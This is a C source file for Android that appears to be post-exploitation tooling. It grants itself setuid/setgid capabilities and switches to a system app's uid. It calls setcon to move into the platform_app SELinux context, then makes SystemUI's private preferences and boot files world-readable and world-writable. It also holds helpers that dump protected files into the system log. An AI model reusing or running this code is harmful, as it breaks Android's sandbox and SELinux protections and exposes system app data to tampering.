#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/capability.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <cutils/properties.h>
//#include <selinux/selinux.h>
#include <dlfcn.h>
#include <stdlib.h>

#include <android/log.h>
#define ALOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define LOG_TAG "findfiles"

#define HOST_NAME "app_process32"
#define CONTEXT_APP "u:r:platform_app:s0:c512,c768"
#define CONTEXT_ZYG "u:r:zygote:s0"
#define CONTEXT_SYS "u:r:system_server:s0"
#define DATAXML "/data/data/com.android.systemui/shared_prefs/com.android.systemui.xml"
#define NEWXML "/data/local/tmp/com.android.systemui.xml"
#define DATADIR "/data/data/com.android.systemui/files"
#define THEID 10067
#define OBJ1 "/data/data/com.android.systemui/files/boot.ad"
#define OBJ2 "/data/data/com.android.systemui/files/boot.ad.image"

void check_context(void) {
    typedef int (*_getcon_ptr)(char** context);
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    if (handle) {

        _getcon_ptr _getcon = dlsym(handle, "getcon");
        char *conn = 0;
        if (_getcon) {
            int ret = _getcon(&conn);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
            } else  {
                ALOG("Current Context: %s",conn);
            }
        }
    }
}

int set_context_new(const char* cont) {
    typedef int (*_setcon_ptr)(const char* context);
    typedef int (*_getcon_ptr)(char** context);
    printf("Read selinux.so");
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    printf("Done.");
    if (handle)
    {
        _getcon_ptr _getcon = dlsym(handle, "getcon");
        _setcon_ptr _setcon = dlsym(handle, "setcon");
        char *conn = 0;
        if (_getcon) {
            int ret = _getcon(&conn);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
                return 2;
            } else  {
                printf("Current context: %s\n",conn);
            }
        }



        if (_setcon)
        {
            int ret = _setcon(cont);
            if (ret) {
                printf("setcon error... %d\n", ret);
                return 2;
            } else {
                printf("setcon success!\n");
            }
        }
        else {
            printf("setcon() not found\n");
            return 2;
        }
        if (conn) {
            ALOG("Old Context WAS: %s",conn);
        }
        char *connNew = 0;
        if (_getcon) {
            int ret = _getcon(&connNew);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
                return 2;
            } else  {
                printf("Current context: %s\n",connNew);
            }
        }
        if (connNew) {
            ALOG("New Context  IS: %s",connNew);
        }

    }
    else {
        printf("libselinux.so not found\n");
        return 2;
    }

    return 0;
}

int logfile(const char* fn) {
    FILE *file;
    size_t  size = 0;
    char* buffer = 0;
    if (file = fopen(fn, "r"))
    {
        ALOG("Can read %s\n",fn);
        
        fseek(file,0,SEEK_END);
        size = ftell(file);
        rewind(file);
        buffer = malloc((size+1)*sizeof(*buffer));
        fread(buffer, size, 1, file);
        buffer[size] = '\0';
        ALOG(buffer);
        free(buffer);
        fclose(file);
    } else {
        ALOG("FAILURE: no reado comprendo %s\n",fn);
        return 2;
    }
    return 0;
}

int logdir(const char* d) {
    DIR *dp;
    struct dirent *ep;
    dp = opendir(d);
    if (dp != NULL) {
        while (ep = readdir(dp)) {
            ALOG("\t%s.. %s", d, ep->d_name);
        }
        closedir(dp);
    } else {
        ALOG("Cannot read/open dir %s", d);
        return 2;
    }
    return 0;
}
int fixmod(const char* element) {
    struct stat st;
    stat(element, &st);
    chmod(element, st.st_mode | S_IWOTH | S_IROTH);
    ALOG("Changed permissions for %s\n",element);
}

int main(int argc, char **argv)
{

    struct __user_cap_header_struct capheader;
    struct __user_cap_data_struct capdata[2];

    printf("running as uid %d\n", getuid());
    fflush(stdout);

    memset(&capheader, 0, sizeof(capheader));
    memset(&capdata, 0, sizeof(capdata));
    capheader.version = _LINUX_CAPABILITY_VERSION_3;
    capdata[CAP_TO_INDEX(CAP_SETUID)].effective |= CAP_TO_MASK(CAP_SETUID);
    capdata[CAP_TO_INDEX(CAP_SETGID)].effective |= CAP_TO_MASK(CAP_SETGID);
    capdata[CAP_TO_INDEX(CAP_SETUID)].permitted |= CAP_TO_MASK(CAP_SETUID);
    capdata[CAP_TO_INDEX(CAP_SETGID)].permitted |= CAP_TO_MASK(CAP_SETGID);
    if (capset(&capheader, &capdata[0]) < 0) {
        printf("Could not set capabilities: %s\n", strerror(errno));
    }
    fflush(stdout);
    if(setresgid(THEID,THEID,THEID) || setresuid(THEID,THEID,THEID)) {
        printf("setresgid/setresuid failed\n");
    }
    printf("uid %d\n", getuid());
    ALOG("uid %d\n", getuid());
    
    check_context();
    int r1 = set_context_new(CONTEXT_APP);
    check_context();

    //logfile(DATAXML);
    //logdir(DATADIR);
    //chmod(DATAXML, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IWOTH|S_IROTH);
    fixmod(DATAXML);
    fixmod(DATADIR);
    fixmod(OBJ1);
    fixmod(OBJ2);
    fflush(stdout);
    return 0;
}
